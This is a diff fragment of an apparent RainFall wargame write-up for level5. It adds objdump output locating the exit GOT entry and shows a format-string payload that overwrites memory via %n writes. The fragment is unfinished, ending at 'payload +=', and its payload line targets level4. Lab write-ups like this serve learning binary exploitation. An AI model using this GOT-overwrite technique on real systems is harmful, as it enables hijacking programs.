@@ -15,9 +15,18 @@ Symbol table '.symtab' contains 73 entries:
 
 address of function o: 080484a4 -->  \xa4\x84\x04\x08
 
+```bash
+level5@RainFall:~$ objdump -R level5 | grep exit
+08049828 R_386_JUMP_SLOT   _exit
+08049838 R_386_JUMP_SLOT   exit
+```
+
+_exit: 08049828 --> \x28\x98\x04\x08
+
 
 ```bash
 (python -c 'print ("\x10\x98\x04\x08" + "\x12\x98\x04\x08" + "%12$n" + "%12$21820x" + "%12$n" + "%12$43966x" + "%13$n")'; cat) | ./level4
 ```
 
+payload +=
 
